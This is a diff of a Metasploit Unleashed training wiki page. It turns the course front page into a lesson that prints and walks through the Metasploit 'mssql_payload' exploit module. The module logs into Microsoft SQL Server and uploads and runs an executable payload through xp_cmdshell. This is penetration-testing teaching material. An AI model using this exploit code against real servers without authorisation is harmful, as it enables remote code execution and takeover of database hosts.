@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Creating Our Auxiliary Module - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Creating_Our_Auxiliary_Module" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Creating_Our_Auxiliary_Module&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Creating_Our_Auxiliary_Module&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Creating_Our_Auxiliary_Module&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,304 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Creating Our Auxiliary Module</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Creating_Our_Auxiliary_Module#column-one">navigation</a>, <a href="Creating_Our_Auxiliary_Module#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>We will be looking at three different files, they should be relatively familar from prior sections. 
+<br />
+<pre>
+/opt/metasploit/msf3/lib/msf/core/exploit/mssql_commands.rb
+/opt/metasploit/msf3/lib/msf/core/exploit/mssql.rb
+/opt/metasploit/msf3/modules/exploits/windows/mssql/mssql_payload.rb</pre>
+<br />
+Lets first take a look at the 'mssql_payload.rb' as to get a better idea at what we will be working with.
+<br />
+<br />
+<pre>##
+# $Id: mssql_payload.rb 7236 2009-10-23 19:15:32Z hdm $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+include Msf::Exploit::Remote::MSSQL
+def initialize(info = {})
+
+super(update_info(info,
+'Name' => 'Microsoft SQL Server Payload Execution',
+'Description' => %q{
+This module will execute an arbitrary payload on a Microsoft SQL
+Server, using the Windows debug.com method for writing an executable to disk
+and the xp_cmdshell stored procedure. File size restrictions are avoided by
+incorporating the debug bypass method presented at Defcon 17 by SecureState.
+Note that this module will leave a metasploit payload in the Windows
+System32 directory which must be manually deleted once the attack is completed.
+},
+'Author' => [ 'David Kennedy "ReL1K"
+'License' => MSF_LICENSE,
+'Version' => '$Revision: 7236 $',
+'References' =>
+[
+[ 'OSVDB', '557'],
+[ 'CVE', '2000-0402'],
+[ 'BID', '1281'],
+[ 'URL', 'http://www.thepentest.com/presentations/FastTrack_ShmooCon2009.pdf'],
+],
+'Platform' => 'win',
+'Targets' =>
+[
+[ 'Automatic', { } ],
+],
+'DefaultTarget' => 0
+))
+end
+
+def exploit
+
+debug = false # enable to see the output
+
+if(not mssql_login_datastore)
+print_status("Invalid SQL Server credentials")
+return
+end
+
+mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded), debug)
+
+handler
+disconnect
+end</pre>
+<br />
+While this file may seem simple, there is actually a lot of going on behind the scenes. Lets break down this file and 
+look at the different sections. Specifically we are calling from the mssql.rb in the lib/msf/core/exploits area.
+<br />
+One of the first things that is done in this file is the importation of the Remote class, and inclusion
+of the MSSQL module.
+<br />
+<br />
+<pre>
+class Metasploit3 < Msf::Exploit::Remote
+
+include Msf::Exploit::Remote::MSSQL
+</pre>
+<br />
+<br />
+The reference section simply enumerates additional information concerning the attack or the initial exploit proof of concept. This
+is where we would find OSVDB references, EDB references and so on.
+<br />
+<br />
+<pre>
+'References' =>
+	[
+	[ 'OSVDB', '557'],
+	[ 'CVE', '2000-0402'],
+	[ 'BID', '1281'],
+	[ 'URL', 'http://www.thepentest.com/presentations/FastTrack_ShmooCon2009.pdf'],
+],
+</pre><html>
+<br>
+The platform section indicates the target's platform and version. The following part is the 'Targets' object,
+which is where different versions would be enumerated. These lines give the user the ability to select 
+a target prior to an attack. The 'DefaultTarget' value is used when no target is specified when setting up the attack.
+<br />
+<br />
+<html><pre>
+'Platform' => 'win',
+'Targets' =>
+	[
+	[ 'Automatic', { } ],
+],
+'DefaultTarget' => 0
+</pre>
+<br />
+<br />
+The 'def exploit' line indicates the beginning of our exploit code. The next declaration is for debugging purposes. Considering there is a lot of information going back and forth, it's a good idea having this set to 'false' until it's needed.
+<br />
+<br />
+<pre>
+debug = false # enable to see the output
+</pre>
+<br />
+Moving on to the next line, this is the most complex portion of the entire attack. This one liner here is really multiple lines of code being pulled from mssql.rb.
+<br />
+<br /> 
+<pre>
+mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded), debug)
+</pre>
+<br />
+mssql_upload_exec (function defined in mssql.rb for uploading an executable through SQL to the underlying operating system)
+<br />
+<br />
+Msf::Util::EXE.to_win32pe(framework,payload.encoded) = create a metasploit payload based off of what you specified, make it an executable and encode it with default encoding
+<br /><br />
+debug = call the debug function is it on or off?
+<br />
+<br />
+Lastly the handler will handle the connections from the payload in the background so we can accept a metasploit payload. The disconnect portion of the code ceases the connection from the MSSQL server.
+Now that we have walked through this portion, we will break down the next section in the mssql.rb to find out exactly what this attack was doing. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Building_A_Module" title="Building A Module">Building A Module</a> &gt; Creating Our Auxiliary Module</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Payloads_Through_MSSQL" title="Payloads Through MSSQL">Payloads Through MSSQL</a> &#124; <strong class="selflink">Creating Our Auxiliary Module</strong> &#124; <a href="The_Guts_Behind_It" title="The Guts Behind It">The Guts Behind It</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 518/1000000
+Preprocessor generated node count: 2715/1000000
+Post‐expand include size: 4958/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:114-0!*!0!*!*!*!* and timestamp 20131124141313 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Creating_Our_Auxiliary_Module&amp;oldid=1450">http://www.offensive-security.com/w/index.php?title=Creating_Our_Auxiliary_Module&amp;oldid=1450</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Building_A_Module&amp;action=edit&amp;redlink=1" class="new" title="Category:Building A Module (page does not exist)">Building A Module</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +789,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.288 secs. --></body></html>
